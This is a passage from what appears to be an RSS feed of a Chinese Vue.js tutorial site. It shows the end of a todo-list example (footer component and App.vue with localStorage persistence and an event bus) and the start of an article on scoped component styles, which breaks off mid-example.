</span></span><span class="line"><span class="cl">      <span class="nx">set</span><span class="p">(</span><span class="nx">isChecked</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">$emit</span><span class="p">(</span><span class="s1">&#39;check-todos&#39;</span><span class="p">,</span> <span class="nx">isChecked</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">clearAllCompleted</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">completedTotal</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;没有已完成的任务&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">confirm</span><span class="p">(</span><span class="s1">&#39;是否清除所有已完成的任务？&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">$emit</span><span class="p">(</span><span class="s1">&#39;clear-completed-todos&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">style</span> <span class="na">scoped</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">todo-footer</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">height</span><span class="p">:</span> <span class="mi">40</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">line-height</span><span class="p">:</span> <span class="mi">40</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">padding-left</span><span class="p">:</span> <span class="mi">6</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">margin-top</span><span class="p">:</span> <span class="mi">5</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">todo-footer</span> <span class="nt">label</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">display</span><span class="p">:</span> <span class="kc">inline-block</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">margin-right</span><span class="p">:</span> <span class="mi">20</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">cursor</span><span class="p">:</span> <span class="kc">pointer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">todo-footer</span> <span class="nt">label</span> <span class="nt">input</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">position</span><span class="p">:</span> <span class="kc">relative</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">top</span><span class="p">:</span> <span class="mi">-1</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">vertical-align</span><span class="p">:</span> <span class="kc">middle</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">margin-right</span><span class="p">:</span> <span class="mi">5</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">todo-footer</span> <span class="nt">button</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">float</span><span class="p">:</span> <span class="kc">right</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">margin-top</span><span class="p">:</span> <span class="mi">5</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span></code></pre></div><h2 id="appvue" data-numberify>App.vue<a class="anchor ms-1" href="#appvue"></a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;root&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;todo-container&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;todo-wrap&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="c">&lt;!-- 将 addTodo 函数传递给子组件 --&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">todo-header</span> <span class="err">@</span><span class="na">add-todo</span><span class="o">=</span><span class="s">&#34;addTodo&#34;</span><span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="c">&lt;!-- 将 todos 列表和 checkTodo 函数传递给子组件 --&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">todo-main</span> 
</span></span><span class="line"><span class="cl">        <span class="na">:todos</span><span class="o">=</span><span class="s">&#34;todos&#34;</span> 
</span></span><span class="line"><span class="cl">      <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="c">&lt;!-- 将 todos 列表和 checkAllTodo 函数传递给子组件 --&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">todo-footer</span> 
</span></span><span class="line"><span class="cl">        <span class="na">:total</span><span class="o">=</span><span class="s">&#34;total&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="na">:completedTotal</span><span class="o">=</span><span class="s">&#34;completedTotal&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="err">@</span><span class="na">check-todos</span><span class="o">=</span><span class="s">&#34;checkAllTodo&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="err">@</span><span class="na">clear-completed-todos</span><span class="o">=</span><span class="s">&#34;clearAllCompletedTodos&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">TodoHeader</span> <span class="nx">from</span> <span class="s1">&#39;./components/todo-header.vue&#39;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">TodoFooter</span> <span class="nx">from</span> <span class="s1">&#39;./components/todo-footer.vue&#39;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">TodoMain</span> <span class="nx">from</span> <span class="s1">&#39;./components/todo-main.vue&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;App&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">components</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">TodoHeader</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">TodoFooter</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">TodoMain</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 将 todos 列表定义在 App.vue 中
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="c1">// || 的原理是，符号左边的值结果不为真则返回符号右边的值
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">todos</span><span class="o">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="s1">&#39;todos&#39;</span><span class="p">))</span> <span class="o">||</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">watch</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">todos</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">deep</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">handler</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="s1">&#39;todos&#39;</span><span class="p">,</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">value</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">computed</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 计算被选 todo 的总数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">completedTotal</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">todos</span><span class="p">.</span><span class="nx">reduce</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="nx">pre</span><span class="p">,</span> <span class="nx">todo</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">pre</span> <span class="o">+</span> <span class="p">(</span><span class="nx">todo</span><span class="p">.</span><span class="nx">isCompleted</span> <span class="o">?</span>  <span class="mi">1</span> <span class="o">:</span> <span class="mi">0</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 计算 todos 总数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">total</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">todos</span><span class="p">.</span><span class="nx">length</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 添加一个 todo
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">addTodo</span><span class="p">(</span><span class="nx">todo</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">this</span><span class="p">.</span><span class="nx">todos</span><span class="p">.</span><span class="nx">unshift</span><span class="p">(</span><span class="nx">todo</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 勾选或取消一个 todo
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">checkTodo</span><span class="p">(</span><span class="nx">id</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">this</span><span class="p">.</span><span class="nx">todos</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">todo</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">todo</span><span class="p">.</span><span class="nx">id</span> <span class="o">===</span> <span class="nx">id</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">todo</span><span class="p">.</span><span class="nx">isCompleted</span> <span class="o">=</span> <span class="o">!</span><span class="nx">todo</span><span class="p">.</span><span class="nx">isCompleted</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 删除一个 todo
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">deleteTodo</span><span class="p">(</span><span class="nx">id</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">this</span><span class="p">.</span><span class="nx">todos</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">todos</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">todo</span> <span class="p">=&gt;</span> <span class="nx">todo</span><span class="p">.</span><span class="nx">id</span> <span class="o">!==</span> <span class="nx">id</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 选择所有或取消选择所有
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">checkAllTodo</span><span class="p">(</span><span class="nx">checked</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">this</span><span class="p">.</span><span class="nx">todos</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">todo</span> <span class="p">=&gt;</span> <span class="nx">todo</span><span class="p">.</span><span class="nx">isCompleted</span> <span class="o">=</span> <span class="nx">checked</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 清除所有已完成的 todo
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">clearAllCompletedTodos</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">this</span><span class="p">.</span><span class="nx">todos</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">todos</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">todo</span> <span class="p">=&gt;</span> <span class="o">!</span><span class="nx">todo</span><span class="p">.</span><span class="nx">isCompleted</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">mounted</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">$bus</span><span class="p">.</span><span class="nx">$on</span><span class="p">(</span><span class="s1">&#39;check-todo&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">checkTodo</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">$bus</span><span class="p">.</span><span class="nx">$on</span><span class="p">(</span><span class="s1">&#39;remove-todo&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">deleteTodo</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">beforeDestroy</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">$bus</span><span class="p">.</span><span class="nx">$off</span><span class="p">(</span><span class="s1">&#39;check-todo&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">$bus</span><span class="p">.</span><span class="nx">$off</span><span class="p">(</span><span class="s1">&#39;remove-todo&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">body</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">background</span><span class="p">:</span> <span class="mh">#fff</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">btn</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">display</span><span class="p">:</span> <span class="kc">inline-block</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">padding</span><span class="p">:</span> <span class="mi">4</span><span class="kt">px</span> <span class="mi">12</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">margin-bottom</span><span class="p">:</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">font-size</span><span class="p">:</span> <span class="mi">14</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">line-height</span><span class="p">:</span> <span class="mi">20</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">text-align</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">vertical-align</span><span class="p">:</span> <span class="kc">middle</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">cursor</span><span class="p">:</span> <span class="kc">pointer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">box-shadow</span><span class="p">:</span> <span class="kc">inset</span> <span class="mi">0</span> <span class="mi">1</span><span class="kt">px</span> <span class="mi">0</span> <span class="nb">rgba</span><span class="p">(</span><span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mf">0.2</span><span class="p">),</span> <span class="mi">0</span> <span class="mi">1</span><span class="kt">px</span> <span class="mi">2</span><span class="kt">px</span> <span class="nb">rgba</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mf">0.05</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">border-radius</span><span class="p">:</span> <span class="mi">4</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">btn-danger</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">color</span><span class="p">:</span> <span class="mh">#fff</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">background-color</span><span class="p">:</span> <span class="mh">#da4f49</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">border</span><span class="p">:</span> <span class="mi">1</span><span class="kt">px</span> <span class="kc">solid</span> <span class="mh">#bd362f</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">btn-danger</span><span class="p">:</span><span class="nd">hover</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">color</span><span class="p">:</span> <span class="mh">#fff</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">background-color</span><span class="p">:</span> <span class="mh">#bd362f</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">btn</span><span class="p">:</span><span class="nd">focus</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">outline</span><span class="p">:</span> <span class="kc">none</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">todo-container</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">width</span><span class="p">:</span> <span class="mi">600</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">margin</span><span class="p">:</span> <span class="mi">0</span> <span class="kc">auto</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">todo-container</span> <span class="p">.</span><span class="nc">todo-wrap</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">padding</span><span class="p">:</span> <span class="mi">10</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">border</span><span class="p">:</span> <span class="mi">1</span><span class="kt">px</span> <span class="kc">solid</span> <span class="mh">#ddd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">border-radius</span><span class="p">:</span> <span class="mi">5</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>Vue 组件样式作用域</title>
      <link>/docs/vue/components/scoped/</link>
      <pubDate>Mon, 18 Sep 2023 02:18:25 +0000</pubDate>
      
      <guid>/docs/vue/components/scoped/</guid>
      <description><![CDATA[样式冲突 Vue多组件开发时，组件中的CSS样式默认是全局使用的。例如在A.vue这个组件中定义的样式，也会在B.vue这个组件中生效。 而当项]]></description>
      <content:encoded><![CDATA[<h1 id="样式冲突" data-numberify>样式冲突<a class="anchor ms-1" href="#样式冲突"></a></h1>
<p>Vue多组件开发时，组件中的CSS样式默认是全局使用的。例如在<code>A.vue</code>这个组件中定义的样式，也会在<code>B.vue</code>这个组件中生效。</p>
<p>而当项目中使用的组件越来越多时，这种全局通过的CSS样式的方式势必会影响整个项目，导致样式冲突。例如<code>A.vue</code>和<code>B.vue</code>都用了<code>.demo</code>这个样式，那么在引入和使用组件时，会造成样式的冲突。相同选择器的样式，究竟是哪个组件中的样式生效？</p>
<p>Vue在引入组件<code>.vue</code>时，如果存在相同的样式导致的冲突，后引入的组件会覆盖先引入的组件中相同的样式。例如<code>A.vue</code>和<code>B.vue</code>都用了<code>.demo</code>这个样式：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">A</span> <span class="nx">from</span> <span class="s1">&#39;./components/A.vue&#39;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">B</span> <span class="nx">from</span> <span class="s1">&#39;./components/B.vue&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">// B 中的 .demo 会覆盖 A 中的 .demo，并全局生效
</span></span></span></code></pre></div><hr>
<h1 id="scoped" data-numberify>Scoped<a class="anchor ms-1" href="#scoped"></a></h1>
<p>为了解决这种样式冲突的问题，Vue引入了<code>scoped</code>（样式范围）。使用<code>scoped</code>可以让当前组件中的样式，仅对当前组件模板中的元素生效（样式局部生效，防止冲突）。</p>
<p><code>scoped</code>的用法是，在<code>.vue</code>中，直接作用在<code>&lt;style&gt;</code>标签上：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">style</span> <span class="na">scoped</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;demo&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>用户姓名：{{name}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>用户年龄：{{age}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>用户性别：{{sex}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;SiteUser&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;张三&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">sex</span><span class="o">:</span> <span class="s1">&#39;男&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">age</span><span class="o">:</span> <span class="mi">21</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">style</span> <span class="na">scoped</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">demo</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">background-color</span><span class="p">:</span> <span class="kc">orange</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;demo&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>网站名称：{{name}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>网站地址：{{url}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;MySite&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
